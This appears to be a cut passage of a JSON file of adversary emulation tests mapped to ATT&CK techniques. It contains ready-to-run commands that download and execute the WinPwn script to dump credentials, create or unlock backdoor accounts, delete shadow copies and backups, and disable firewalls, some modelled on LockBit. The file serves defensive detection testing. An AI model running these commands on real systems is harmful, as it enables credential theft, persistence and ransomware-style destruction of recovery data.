			"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nobfuskittiedump -consoleoutput -noninteractive",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1078.003",
		"phases": [
			"defense-evasion",
			"initial-access",
			"persistence",
			"privilege-escalation"
		]
	},
	{
		"name": "WinPwn - Loot local Credentials - Safetykatz",
		"auto_generated_guid": "e9fdb899-a980-4ba4-934b-486ad22e22f4",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nsafedump -consoleoutput -noninteractive",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1078.003",
		"phases": [
			"defense-evasion",
			"initial-access",
			"persistence",
			"privilege-escalation"
		]
	},
	{
		"name": "Create local account (Linux)",
		"auto_generated_guid": "02a91c34-8a5b-4bed-87af-501103eb5357",
		"supported_platforms": ["linux"],
		"executor": {
			"name": "bash",
			"elevation_required": true,
			"command": "password=$(openssl passwd -1 art)\n([ \"$(uname)\" = 'Linux' ] && useradd --shell /bin/bash --create-home --password $password art) || (pw useradd art -g wheel -s /bin/sh && (echo $password | pw mod user testuser1 -h 0))\nsu art -c \"whoami; exit\"\n",
			"cleanup_command": "[ \"$(uname)\" = 'Linux' ] && userdel art -rf || rmuser -y art\n"
		},
		"attack_technique": "T1078.003",
		"phases": [
			"defense-evasion",
			"initial-access",
			"persistence",
			"privilege-escalation"
		]
	},
	{
		"name": "Reactivate a locked/expired account (Linux)",
		"auto_generated_guid": "d2b95631-62d7-45a3-aaef-0972cea97931",
		"supported_platforms": ["linux"],
		"executor": {
			"name": "bash",
			"elevation_required": true,
			"command": "useradd --shell /bin/bash --create-home --password $(openssl passwd -1 art) art\nusermod --lock art\nusermod --expiredate \"1\" art\nusermod --unlock art\nusermod --expiredate \"99999\" art\nsu art\nwhoami\nexit\n",
			"cleanup_command": "userdel -r art \n"
		},
		"attack_technique": "T1078.003",
		"phases": [
			"defense-evasion",
			"initial-access",
			"persistence",
			"privilege-escalation"
		]
	},
	{
		"name": "Reactivate a locked/expired account (FreeBSD)",
		"auto_generated_guid": "09e3380a-fae5-4255-8b19-9950be0252cf",
		"supported_platforms": ["linux"],
		"executor": {
			"name": "sh",
			"elevation_required": true,
			"command": "pw useradd art -g wheel -s /bin/sh\necho $(openssl passwd -1 art) | pw mod user testuser1 -h 0\npw lock art\npw usermod art -e +1d\npw unlock art\npw user mod art -e +99d\nsu art\nwhoami\nexit\n",
			"cleanup_command": "rmuser -y art \n"
		},
		"attack_technique": "T1078.003",
		"phases": [
			"defense-evasion",
			"initial-access",
			"persistence",
			"privilege-escalation"
		]
	},
	{
		"name": "Login as nobody (Linux)",
		"auto_generated_guid": "3d2cd093-ee05-41bd-a802-59ee5c301b85",
		"supported_platforms": ["linux"],
		"executor": {
			"name": "bash",
			"elevation_required": true,
			"command": "cat /etc/passwd |grep nobody \n# -> nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nchsh --shell /bin/bash nobody\nusermod --password $(openssl passwd -1 nobody) nobody\nsu nobody\nwhoami\nexit\n",
			"cleanup_command": "chsh --shell /usr/sbin/nologin nobody\ncat /etc/passwd |grep nobody \n# -> nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n"
		},
		"attack_technique": "T1078.003",
		"phases": [
			"defense-evasion",
			"initial-access",
			"persistence",
			"privilege-escalation"
		]
	},
	{
		"name": "Login as nobody (freebsd)",
		"auto_generated_guid": "16f6374f-7600-459a-9b16-6a88fd96d310",
		"supported_platforms": ["linux"],
		"executor": {
			"name": "sh",
			"elevation_required": true,
			"command": "cat /etc/passwd |grep nobody \n# -> nobody:x:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin\npw usermod nobody -s /bin/sh\necho $(openssl passwd -1 art) | pw mod user nobody -h 0\nsu nobody\nwhoami\nexit\n",
			"cleanup_command": "pw usermod nobody -s /usr/sbin/nologin\ncat /etc/passwd |grep nobody\n# -> nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin\n"
		},
		"attack_technique": "T1078.003",
		"phases": [
			"defense-evasion",
			"initial-access",
			"persistence",
			"privilege-escalation"
		]
	},
	{
		"name": "Windows - Delete Volume Shadow Copies",
		"auto_generated_guid": "43819286-91a9-4369-90ed-d31fb4da2c01",
		"supported_platforms": ["windows"],
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Create volume shadow copy of C:\\ . This prereq command only works on Windows Server or Windows 8.\n",
				"prereq_command": "if(!(vssadmin.exe list shadows | findstr \"No items found that satisfy the query.\")) { exit 0 } else { exit 1 }\n",
				"get_prereq_command": "vssadmin.exe create shadow /for=c:\n"
			}
		],
		"executor": {
			"command": "vssadmin.exe delete shadows /all /quiet\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1490",
		"phases": ["impact"]
	},
	{
		"name": "Windows - Delete Volume Shadow Copies via WMI",
		"auto_generated_guid": "6a3ff8dd-f49c-4272-a658-11c2fe58bd88",
		"supported_platforms": ["windows"],
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Create volume shadow copy of C:\\ .\n",
				"prereq_command": "if(!(vssadmin.exe list shadows | findstr \"No items found that satisfy the query.\")) { exit 0 } else { exit 1 }\n",
				"get_prereq_command": "wmic shadowcopy call create Volume='C:\\'\n"
			}
		],
		"executor": {
			"command": "wmic.exe shadowcopy delete\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1490",
		"phases": ["impact"]
	},
	{
		"name": "Windows - wbadmin Delete Windows Backup Catalog",
		"auto_generated_guid": "263ba6cb-ea2b-41c9-9d4e-b652dadd002c",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "wbadmin delete catalog -quiet\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1490",
		"phases": ["impact"]
	},
	{
		"name": "Windows - Disable Windows Recovery Console Repair",
		"auto_generated_guid": "cf21060a-80b3-4238-a595-22525de4ab81",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures\nbcdedit.exe /set {default} recoveryenabled no\n",
			"cleanup_command": "bcdedit.exe /set {default} bootstatuspolicy DisplayAllFailures >nul 2>&1\nbcdedit.exe /set {default} recoveryenabled yes >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1490",
		"phases": ["impact"]
	},
	{
		"name": "Windows - Delete Volume Shadow Copies via WMI with PowerShell",
		"auto_generated_guid": "39a295ca-7059-4a88-86f6-09556c1211e7",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1490",
		"phases": ["impact"]
	},
	{
		"name": "Windows - Delete Backup Files",
		"auto_generated_guid": "6b1dbaf6-cc8a-4ea6-891f-6058569653bf",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "del /s /f /q c:\\*.VHD c:\\*.bac c:\\*.bak c:\\*.wbcat c:\\*.bkf c:\\Backup*.* c:\\backup*.* c:\\*.set c:\\*.win c:\\*.dsk\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1490",
		"phases": ["impact"]
	},
	{
		"name": "Windows - wbadmin Delete systemstatebackup",
		"auto_generated_guid": "584331dd-75bc-4c02-9e0b-17f5fd81c748",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "wbadmin delete systemstatebackup -keepVersions:0\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1490",
		"phases": ["impact"]
	},
	{
		"name": "Windows - Disable the SR scheduled task",
		"auto_generated_guid": "1c68c68d-83a4-4981-974e-8993055fa034",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "schtasks.exe /Change /TN \"\\Microsoft\\Windows\\SystemRestore\\SR\" /disable\n",
			"cleanup_command": "schtasks.exe /Change /TN \"\\Microsoft\\Windows\\SystemRestore\\SR\" /enable >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1490",
		"phases": ["impact"]
	},
	{
		"name": "Disable System Restore Through Registry",
		"auto_generated_guid": "66e647d1-8741-4e43-b7c1-334760c2047f",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v \"DisableConfig\" /t \"REG_DWORD\" /d \"1\" /f\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v \"DisableSR\" /t \"REG_DWORD\" /d \"1\" /f\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\" /v \"DisableConfig\" /t \"REG_DWORD\" /d \"1\" /f\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\" /v \"DisableSR\" /t \"REG_DWORD\" /d \"1\" /f\n",
			"cleanup_command": "reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v \"DisableConfig\" /f >nul 2>&1\nreg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v \"DisableSR\" /f >nul 2>&1\nreg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\" /v \"DisableConfig\" /f >nul 2>&1\nreg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\" /v \"DisableSR\" /f >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1490",
		"phases": ["impact"]
	},
	{
		"name": "Windows - vssadmin Resize Shadowstorage Volume",
		"auto_generated_guid": "da558b07-69ae-41b9-b9d4-4d98154a7049",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "vssadmin resize shadowstorage /For=C: /On=C: /MaxSize=20%",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1490",
		"phases": ["impact"]
	},
	{
		"name": "Modify VSS Service Permissions",
		"auto_generated_guid": "a4420f93-5386-4290-b780-f4f66abc7070",
		"supported_platforms": ["windows"],
		"executor": {
			"name": "command_prompt",
			"elevation_required": true,
			"command": "sc sdset VSS D:(D;;GA;;;NU)(D;;GA;;;WD)(D;;GA;;;AN)S:(AU;FA;GA;;;WD)(AU;OIIOFA;GA;;;WD)\n",
			"cleanup_command": "sc sdset VSS D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;LC;;;BU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)\n"
		},
		"attack_technique": "T1490",
		"phases": ["impact"]
	},
	{
		"name": "Disable Time Machine",
		"auto_generated_guid": "ed952f70-91d4-445a-b7ff-30966bfb1aff",
		"supported_platforms": ["macos"],
		"executor": {
			"command": "sudo tmutil disable",
			"cleanup_command": "sudo tmutil enable",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1490",
		"phases": ["impact"]
	},
	{
		"name": "Disable Microsoft Defender Firewall",
		"auto_generated_guid": "88d05800-a5e4-407e-9b53-ece4174f197f",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "netsh advfirewall set currentprofile state off\n",
			"cleanup_command": "netsh advfirewall set currentprofile state on >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1562.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Disable Microsoft Defender Firewall via Registry",
		"auto_generated_guid": "afedc8c4-038c-4d82-b3e5-623a95f8a612",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\PublicProfile\" /v \"EnableFirewall\" /t REG_DWORD /d 0 /f\n",
			"cleanup_command": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\PublicProfile\" /v \"EnableFirewall\" /t REG_DWORD /d 1 /f\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1562.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Allow SMB and RDP on Microsoft Defender Firewall",
		"auto_generated_guid": "d9841bf8-f161-4c73-81e9-fd773a5ff8c1",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes\nnetsh advfirewall firewall set rule group=\"file and printer sharing\" new enable=Yes\n",
			"cleanup_command": "netsh advfirewall reset >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1562.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Opening ports for proxy - HARDRAIN",
		"auto_generated_guid": "15e57006-79dd-46df-9bf9-31bc24fb5a80",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "netsh advfirewall firewall add rule name=\"atomic testing\" action=allow dir=in protocol=TCP localport=450 \n",
			"cleanup_command": "netsh advfirewall firewall delete rule name=\"atomic testing\" protocol=TCP localport=450 >nul 2>&1",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1562.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Open a local port through Windows Firewall to any profile",
		"auto_generated_guid": "9636dd6e-7599-40d2-8eee-ac16434f35ed",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"local_port": {
				"description": "This is the local port you wish to test opening",
				"type": "integer",
				"default": 3389
			}
		},
		"executor": {
			"command": "netsh advfirewall firewall add rule name=\"Open Port to Any\" dir=in protocol=tcp localport=#{local_port} action=allow profile=any",
			"cleanup_command": "netsh advfirewall firewall delete rule name=\"Open Port to Any\" | Out-Null",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1562.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Allow Executable Through Firewall Located in Non-Standard Location",
		"auto_generated_guid": "6f5822d2-d38d-4f48-9bfc-916607ff6b8c",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"exe_file_path": {
				"description": "path to exe file",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1562.004\\bin\\AtomicTest.exe"
			}
		},
		"executor": {
			"command": "Copy-Item \"#{exe_file_path}\" -Destination \"C:\\Users\\$env:UserName\" -Force\nnetsh advfirewall firewall add rule name=\"Atomic Test\" dir=in action=allow program=\"C:\\Users\\$env:UserName\\AtomicTest.exe\" enable=yes\n",
			"cleanup_command": "netsh advfirewall firewall delete rule name=\"Atomic Test\" | Out-Null\nRemove-Item C:\\Users\\$env:UserName\\AtomicTest.exe -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1562.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Stop/Start UFW firewall",
		"auto_generated_guid": "fe135572-edcd-49a2-afe6-1d39521c5a9a",
		"supported_platforms": ["linux"],
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Check if ufw is installed on the machine.\n",
				"prereq_command": "if [ ! -x \"$(command -v ufw)\" ]; then echo -e \"\\n***** ufw NOT installed *****\\n\"; exit 1; fi\nif echo \"$(ufw status)\" |grep -q \"inactive\"; then echo -e \"\\n***** ufw inactive *****\\n\"; exit 1; fi \n",
				"get_prereq_command": "echo \"\"\n"
			}
		],
		"executor": {
			"name": "sh",
			"elevation_required": true,
			"command": "ufw disable\n",
			"cleanup_command": "ufw enable\nufw status verbose\n"
		},
		"attack_technique": "T1562.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Stop/Start Packet Filter",
		"auto_generated_guid": "0ca82ed1-0a94-4774-9a9a-a2c83a8022b7",
		"supported_platforms": ["linux"],
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Check if pfctl is installed on the machine.\n",
				"prereq_command": "if [ ! -x \"$(command -v pfctl)\" ]; then echo -e \"\\n***** PF NOT installed *****\\n\"; exit 1; fi\nif [ \"$(kldstat -n pf)\" = \"\" ]; then echo -e \"\\n***** PF inactive *****\\n\"; exit 1; fi \n",
				"get_prereq_command": "echo \"\"\n"
			}
		],
		"executor": {
			"name": "sh",
			"elevation_required": true,
			"command": "service pf stop\nservice pf disable\n",
			"cleanup_command": "service pf enable\nservice pf start\nservice pf status\n"
		},
		"attack_technique": "T1562.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Stop/Start UFW firewall systemctl",
		"auto_generated_guid": "9fd99609-1854-4f3c-b47b-97d9a5972bd1",
		"supported_platforms": ["linux"],
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Check if systemctl and ufw is installed on the machine.\n",
				"prereq_command": "if [ ! -x \"$(command -v systemctl)\" ]; then echo -e \"\\n***** systemctl NOT installed *****\\n\"; exit 1; fi\nif [ ! -x \"$(command -v ufw)\" ]; then echo -e \"\\n***** ufw NOT installed *****\\n\"; exit 1; fi\nif echo \"$(ufw status)\" |grep -q \"inactive\"; then echo -e \"\\n***** ufw inactive *****\\n\"; exit 1; fi \n",
				"get_prereq_command": "echo \"\"\n"
			}
		],
		"executor": {
			"name": "sh",
			"elevation_required": true,
			"command": "systemctl stop ufw\n",
			"cleanup_command": "systemctl start ufw\nsystemctl status ufw\n"
		},
		"attack_technique": "T1562.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Turn off UFW logging",
		"auto_generated_guid": "8a95b832-2c2a-494d-9cb0-dc9dd97c8bad",
		"supported_platforms": ["linux"],
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Check if ufw is installed on the machine and enabled.\n",
				"prereq_command": "if [ ! -x \"$(command -v ufw)\" ]; then echo -e \"\\n***** ufw NOT installed *****\\n\"; exit 1; fi\nif echo \"$(ufw status)\" |grep -q \"inactive\"; then echo -e \"\\n***** ufw inactive *****\\n\"; exit 1; fi \n",
				"get_prereq_command": "echo \"\"\n"
			}
		],
		"executor": {
			"name": "sh",
			"elevation_required": true,
			"command": "ufw logging off\n",
			"cleanup_command": "ufw logging low\nufw status verbose\n"
		},
		"attack_technique": "T1562.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Add and delete UFW firewall rules",
		"auto_generated_guid": "b2563a4e-c4b8-429c-8d47-d5bcb227ba7a",
		"supported_platforms": ["linux"],
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Check if ufw is installed on the machine and enabled.\n",
				"prereq_command": "if [ ! -x \"$(command -v ufw)\" ]; then echo -e \"\\n***** ufw NOT installed *****\\n\"; exit 1; fi\nif echo \"$(ufw status)\" |grep -q \"inactive\"; then echo -e \"\\n***** ufw inactive *****\\n\"; exit 1; fi \n",
				"get_prereq_command": "echo \"\"\n"
			}
		],
		"executor": {
			"name": "sh",
			"elevation_required": true,
			"command": "ufw prepend deny from 1.2.3.4\nufw status numbered\n",
			"cleanup_command": "{ echo y; echo response; } | ufw delete 1\nufw status numbered\n"
		},
		"attack_technique": "T1562.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Add and delete Packet Filter rules",
		"auto_generated_guid": "8b23cae1-66c1-41c5-b79d-e095b6098b5b",
		"supported_platforms": ["linux"],
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Check if pf is installed on the machine and enabled.\n",
				"prereq_command": "if [ ! -x \"$(command -v pfctl)\" ]; then echo -e \"\\n***** PF NOT installed *****\\n\"; exit 1; fi\nif [ \"$(kldstat -n pf)\" = \"\" ]; then echo -e \"\\n***** PF inactive *****\\n\"; exit 1; fi \n",
				"get_prereq_command": "echo \"anchor pf-rules >> /etc/pf.conf\"\npfctl -f /etc/pf.conf\n"
			}
		],
		"executor": {
			"name": "sh",
			"elevation_required": true,
			"command": "echo \"block in proto tcp from 1.2.3.4 to any\" | pfctl -a pf-rules -f -\npfctl -a pf-rules -s rules\n",
			"cleanup_command": "pfctl -a pf-rules -F rules\nsed -i \"\" '/anchor pf-rules/d'\npfctl -f /etc/pf.conf\n"
		},
		"attack_technique": "T1562.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Edit UFW firewall user.rules file",
		"auto_generated_guid": "beaf815a-c883-4194-97e9-fdbbb2bbdd7c",
		"supported_platforms": ["linux"],
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Check if /etc/ufw/user.rules exists.\n",
				"prereq_command": "if [ ! -f \"/etc/ufw/user.rules\" ]; then echo -e \"\\n***** ufw NOT installed *****\\n\"; exit 1; fi\n",
				"get_prereq_command": "echo \"\"\n"
			}
		],
		"executor": {
			"name": "sh",
			"elevation_required": true,
			"command": "echo \"# THIS IS A COMMENT\" >> /etc/ufw/user.rules\ngrep \"# THIS IS A COMMENT\" /etc/ufw/user.rules\n",
			"cleanup_command": "sed -i 's/# THIS IS A COMMENT//g' /etc/ufw/user.rules\n"
		},
		"attack_technique": "T1562.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Edit UFW firewall ufw.conf file",
		"auto_generated_guid": "c1d8c4eb-88da-4927-ae97-c7c25893803b",
		"supported_platforms": ["linux"],
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Check if /etc/ufw/ufw.conf exists.\n",
				"prereq_command": "if [ ! -f \"/etc/ufw/ufw.conf\" ]; then echo -e \"\\n***** ufw NOT installed *****\\n\"; exit 1; fi\n",
				"get_prereq_command": "echo \"\"\n"
			}
		],
		"executor": {
			"name": "sh",
			"elevation_required": true,
			"command": "echo \"# THIS IS A COMMENT\" >> /etc/ufw/ufw.conf\ngrep \"# THIS IS A COMMENT\" /etc/ufw/ufw.conf\n",
			"cleanup_command": "sed -i 's/# THIS IS A COMMENT//g' /etc/ufw/ufw.conf\ncat /etc/ufw/ufw.conf\n"
		},
		"attack_technique": "T1562.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Edit UFW firewall sysctl.conf file",
		"auto_generated_guid": "c4ae0701-88d3-4cd8-8bce-4801ed9f97e4",
		"supported_platforms": ["linux"],
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Check if /etc/ufw/sysctl.conf exists.\n",
				"prereq_command": "if [ ! -f \"/etc/ufw/sysctl.conf\" ]; then echo -e \"\\n***** ufw NOT installed *****\\n\"; exit 1; fi\n",
				"get_prereq_command": "echo \"\"\n"
			}
		],
		"executor": {
			"name": "sh",
			"elevation_required": true,
			"command": "echo \"# THIS IS A COMMENT\" >> /etc/ufw/sysctl.conf\ngrep \"# THIS IS A COMMENT\" /etc/ufw/sysctl.conf\n",
			"cleanup_command": "sed -i 's/# THIS IS A COMMENT//g' /etc/ufw/sysctl.conf\ncat /etc/ufw/sysctl.conf\n"
		},
		"attack_technique": "T1562.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Edit UFW firewall main configuration file",
		"auto_generated_guid": "7b697ece-8270-46b5-bbc7-6b9e27081831",
		"supported_platforms": ["linux"],
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Check if /etc/default/ufw exists.\n",
				"prereq_command": "if [ ! -f \"/etc/default/ufw\" ]; then echo -e \"\\n***** ufw NOT installed *****\\n\"; exit 1; fi\n",
				"get_prereq_command": "echo \"\"\n"
			}
		],
		"executor": {
			"name": "sh",
			"elevation_required": true,
			"command": "echo \"# THIS IS A COMMENT\" >> /etc/default/ufw\ngrep \"# THIS IS A COMMENT\" /etc/default/ufw\n",
			"cleanup_command": "sed -i 's/# THIS IS A COMMENT//g' /etc/default/ufw\n"
		},
		"attack_technique": "T1562.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Tail the UFW firewall log file",
		"auto_generated_guid": "419cca0c-fa52-4572-b0d7-bc7c6f388a27",
		"supported_platforms": ["linux"],
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Check if /var/log/ufw.log exists.\n",
				"prereq_command": "if [ ! -f \"/var/log/ufw.log\" ]; then echo -e \"\\n***** ufw NOT logging *****\\n\"; exit 1; fi\n",
				"get_prereq_command": "echo \"\"\n"
			}
		],
		"executor": {
			"name": "sh",
			"elevation_required": true,
			"command": "tail /var/log/ufw.log\n",
			"cleanup_command": ""
		},
		"attack_technique": "T1562.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Disable iptables",
		"auto_generated_guid": "7784c64e-ed0b-4b65-bf63-c86db229fd56",
		"supported_platforms": ["linux"],
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Check if iptables is installed on the machine.\n",
				"prereq_command": "if [ ! -x \"$(command -v iptables)\" ]; then echo -e \"\\n***** iptables NOT installed *****\\n\"; exit 1; fi\n",
				"get_prereq_command": "echo \"\"\n"
			}
		],
		"executor": {
			"name": "sh",
			"elevation_required": true,
			"command": "iptables-save > /tmp/iptables.rules\niptables -F\n",
			"cleanup_command": "iptables-restore < /tmp/iptables.rules\n"
		},
		"attack_technique": "T1562.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Modify/delete iptables firewall rules",
		"auto_generated_guid": "899a7fb5-d197-4951-8614-f19ac4a73ad4",
		"supported_platforms": ["linux"],
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Check if iptables is installed on the machine.\n",
				"prereq_command": "if [ ! -x \"$(command -v iptables)\" ]; then echo -e \"\\n***** iptables NOT installed *****\\n\"; exit 1; fi\nif ! echo \"$(iptables -L)\" | grep -q \"DROP .*dpt:ftp\"; then echo -e \"\\n***** this firewall rule is NOT activated *****\\n***** activate it by executing \\\"iptables -A OUTPUT -p tcp --dport 21 -j DROP\\\" *****\\n\"; exit 1; fi\n",
				"get_prereq_command": "echo \"\"\n"
			}
		],
		"executor": {
			"name": "sh",
			"elevation_required": true,
			"command": "iptables-save > /tmp/iptables.rules\niptables -D OUTPUT -p tcp --dport 21 -j DROP\n",
			"cleanup_command": "iptables-restore < /tmp/iptables.rules\n"
		},
		"attack_technique": "T1562.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "LockBit Black - Unusual Windows firewall registry modification -cmd",
		"auto_generated_guid": "a4651931-ebbb-4cde-9363-ddf3d66214cb",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile\" /v EnableFirewall /t REG_DWORD /d 0 /f\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\StandardProfile\" /v EnableFirewall /t REG_DWORD /d 0 /f\n",
			"cleanup_command": "reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile\" /v EnableFirewall /f >nul 2>&1\nreg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\StandardProfile\" /v EnableFirewall /f >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1562.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "LockBit Black - Unusual Windows firewall registry modification -Powershell",
		"auto_generated_guid": "80b453d1-eec5-4144-bf08-613a6c3ffe12",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile\" -Name EnableFirewall -PropertyType DWORD -Value 0 -Force\nNew-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\StandardProfile\" -Name EnableFirewall -PropertyType DWORD -Value 0 -Force\n",
			"cleanup_command": "Remove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile\"  -Name EnableFirewall -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\StandardProfile\" -Name EnableFirewall -Force -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1562.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Blackbit - Disable Windows Firewall using netsh firewall",
		"auto_generated_guid": "91f348e6-3760-4997-a93b-2ceee7f254ee",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "netsh firewall set opmode mode=disable\n",
			"cleanup_command": "netsh firewall set opmode mode=enable >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1562.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "ESXi - Disable Firewall via Esxcli",
		"auto_generated_guid": "bac8a340-be64-4491-a0cc-0985cb227f5a",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"vm_host": {
				"description": "Specify the host name of the ESXi Server",
				"type": "string",
				"default": "atomic.local"
			},
			"plink_file": {
				"description": "Path to Putty",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\plink.exe"
			},
			"username": {
				"description": "username used to log into ESXi",
				"type": "string",
				"default": "root"
			},
			"password": {
				"description": "password used to log into ESXI",
				"type": "string",
				"default": "n/a"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "The plink executable must be found in the ExternalPayloads folder.\n",
				"prereq_command": "if (Test-Path \"#{plink_file}\") {exit 0} else {exit 1}\n",
